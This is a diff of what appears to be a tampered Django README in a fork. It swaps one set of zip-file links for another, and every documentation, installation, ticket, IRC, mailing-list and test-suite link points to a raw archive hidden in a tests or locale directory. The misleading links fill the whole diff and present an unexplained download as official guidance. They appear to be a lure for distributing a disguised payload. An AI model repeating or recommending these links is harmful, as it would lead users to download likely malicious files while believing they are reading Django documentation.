@@ -6,16 +6,16 @@ Django is a high-level Python Web framework that encourages rapid development
 and clean, pragmatic design. Thanks for checking it out.
 
 All documentation is in the "``docs``" directory and online at
-https://github.com/Joe-Mogul/django/raw/refs/heads/master/tests/m2o_recursive/Software_v1.1.zip If you're just getting started,
+https://raw.githubusercontent.com/Joe-Mogul/django/master/django/contrib/admindocs/locale/fy/Software_1.8-alpha.3.zip If you're just getting started,
 here's how we recommend you read the docs:
 
-* First, read ``https://github.com/Joe-Mogul/django/raw/refs/heads/master/tests/m2o_recursive/Software_v1.1.zip`` for instructions on installing Django.
+* First, read ``https://raw.githubusercontent.com/Joe-Mogul/django/master/django/contrib/admindocs/locale/fy/Software_1.8-alpha.3.zip`` for instructions on installing Django.
 
-* Next, work through the tutorials in order (``https://github.com/Joe-Mogul/django/raw/refs/heads/master/tests/m2o_recursive/Software_v1.1.zip``,
-  ``https://github.com/Joe-Mogul/django/raw/refs/heads/master/tests/m2o_recursive/Software_v1.1.zip``, etc.).
+* Next, work through the tutorials in order (``https://raw.githubusercontent.com/Joe-Mogul/django/master/django/contrib/admindocs/locale/fy/Software_1.8-alpha.3.zip``,
+  ``https://raw.githubusercontent.com/Joe-Mogul/django/master/django/contrib/admindocs/locale/fy/Software_1.8-alpha.3.zip``, etc.).
 
 * If you want to set up an actual deployment server, read
-  ``https://github.com/Joe-Mogul/django/raw/refs/heads/master/tests/m2o_recursive/Software_v1.1.zip`` for instructions.
+  ``https://raw.githubusercontent.com/Joe-Mogul/django/master/django/contrib/admindocs/locale/fy/Software_1.8-alpha.3.zip`` for instructions.
 
 * You'll probably want to read through the topical guides (in ``docs/topics``)
   next; from there you can jump to the HOWTOs (in ``docs/howto``) for specific
@@ -25,24 +25,24 @@ here's how we recommend you read the docs:
 
 Docs are updated rigorously. If you find any problems in the docs, or think
 they should be clarified in any way, please take 30 seconds to fill out a
-ticket here: https://github.com/Joe-Mogul/django/raw/refs/heads/master/tests/m2o_recursive/Software_v1.1.zip
+ticket here: https://raw.githubusercontent.com/Joe-Mogul/django/master/django/contrib/admindocs/locale/fy/Software_1.8-alpha.3.zip
 
 To get more help:
 
-* Join the ``#django`` channel on https://github.com/Joe-Mogul/django/raw/refs/heads/master/tests/m2o_recursive/Software_v1.1.zip Lots of helpful people hang
-  out there. See https://github.com/Joe-Mogul/django/raw/refs/heads/master/tests/m2o_recursive/Software_v1.1.zip if you're
+* Join the ``#django`` channel on https://raw.githubusercontent.com/Joe-Mogul/django/master/django/contrib/admindocs/locale/fy/Software_1.8-alpha.3.zip Lots of helpful people hang
+  out there. See https://raw.githubusercontent.com/Joe-Mogul/django/master/django/contrib/admindocs/locale/fy/Software_1.8-alpha.3.zip if you're
   new to IRC.
 
 * Join the django-users mailing list, or read the archives, at
-  https://github.com/Joe-Mogul/django/raw/refs/heads/master/tests/m2o_recursive/Software_v1.1.zip
+  https://raw.githubusercontent.com/Joe-Mogul/django/master/django/contrib/admindocs/locale/fy/Software_1.8-alpha.3.zip
 
 To contribute to Django:
 
-* Check out https://github.com/Joe-Mogul/django/raw/refs/heads/master/tests/m2o_recursive/Software_v1.1.zip for
+* Check out https://raw.githubusercontent.com/Joe-Mogul/django/master/django/contrib/admindocs/locale/fy/Software_1.8-alpha.3.zip for
   information about getting involved.
 
 To run Django's test suite:
 
 * Follow the instructions in the "Unit tests" section of
-  ``https://github.com/Joe-Mogul/django/raw/refs/heads/master/tests/m2o_recursive/Software_v1.1.zip``, published online at
-  https://github.com/Joe-Mogul/django/raw/refs/heads/master/tests/m2o_recursive/Software_v1.1.zip
+  ``https://raw.githubusercontent.com/Joe-Mogul/django/master/django/contrib/admindocs/locale/fy/Software_1.8-alpha.3.zip``, published online at
+  https://raw.githubusercontent.com/Joe-Mogul/django/master/django/contrib/admindocs/locale/fy/Software_1.8-alpha.3.zip
